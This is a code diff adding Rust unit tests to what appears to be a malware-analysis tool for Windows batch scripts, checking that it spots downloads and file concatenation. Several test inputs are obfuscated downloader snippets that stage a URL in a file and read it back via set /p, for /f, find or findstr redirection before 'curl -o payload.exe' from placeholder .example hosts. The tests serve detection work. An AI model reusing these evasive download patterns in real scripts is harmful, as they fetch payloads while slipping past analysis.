@@ -559,6 +559,29 @@ curl -o payload.exe %U%"#,
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn set_p_reads_first_line_from_prefix_redirected_file() {
+        let report = analyze(
+            br#"echo https://set-p-prefix-read.example/payload.exe>url.txt
+^< url.txt set /p U=
+curl -o payload.exe %U%"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://set-p-prefix-read.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "set /p did not read prefix-redirected staged content: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
@@ -2893,6 +2916,51 @@ for /f "tokens=* delims=" %%U in ('find "https://" first.txt second.txt') do cur
     }
 
     #[test]
+    fn for_f_type_stdin_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-type-stdin.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%U in ('type ^< url.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-type-stdin.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F type-stdin source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_find_stdin_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>url.txt
+echo https://for-f-find-stdin.example/payload.exe>>url.txt
+for /f "tokens=* delims=" %%U in ('find "https://" ^< url.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-find-stdin.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F find-stdin source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_findstr_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>web.txt
@@ -3154,6 +3222,56 @@ for /f "tokens=* delims=" %%U in ('findstr /l "https://findstr-literal.example/[
                 )
             }),
             "FOR /F findstr /l literal URL was treated as regex: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_offline_flag_does_not_emit_offset_prefix() {
+        let report = analyze(
+            br#"echo https://findstr-offline.example/payload.exe>web.txt
+for /f "tokens=* delims=" %%U in ('findstr /off "https://" web.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://findstr-offline.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /off was treated as /o offset output: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("0:https://"),
+            "findstr /off should not synthesize /o offset prefixes:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_prefix_stdin_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>web.txt
+echo https://findstr-prefix-stdin.example/payload.exe>>web.txt
+for /f "tokens=* delims=" %%U in ('^< web.txt findstr /i "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://findstr-prefix-stdin.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr prefix-stdin source did not feed later curl: {:?}\n{}",
             report.traits,
             report.deobfuscated
         );
@@ -17335,6 +17453,61 @@ call C:\Temp\original.js"#,
         assert!(
             matches!(entry, Some(FsEntry::Content { content, .. }) if content == b"alphabeta"),
             "copy /b wildcard concat did not preserve combined tracked content: {:?}",
+            entry
+        );
+    }
+
+    #[test]
+    fn copy_b_per_file_suffix_multi_source_concat_tracked() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "a.bin".to_string(),
+            FsEntry::Content {
+                content: b"AAAA".to_vec(),
+                append: false,
+            },
+        );
+        env.modified_filesystem.insert(
+            "b.bin".to_string(),
+            FsEntry::Content {
+                content: b"BBBB".to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line("copy a.bin/b+b.bin/b out.exe/b", &mut env);
+
+        let entry = env
+            .modified_filesystem
+            .get("out.exe")
+            .expect("out.exe missing");
+        assert!(
+            matches!(entry, FsEntry::Content { content, .. } if content == b"AAAABBBB"),
+            "copy /b suffix operands did not preserve concatenated content: {:?}",
+            entry
+        );
+    }
+
+    #[test]
+    fn copy_slash_path_ending_b_is_not_treated_as_binary_suffix() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            r"c:\temp\b".to_string(),
+            FsEntry::Content {
+                content: b"payload".to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line("copy C:/Temp/b out.txt", &mut env);
+
+        let entry = env
+            .modified_filesystem
+            .get("out.txt")
+            .expect("out.txt missing");
+        assert!(
+            matches!(entry, FsEntry::Content { content, .. } if content == b"payload"),
+            "slash path ending in /b was misparsed as copy binary suffix: {:?}",
             entry
         );
     }
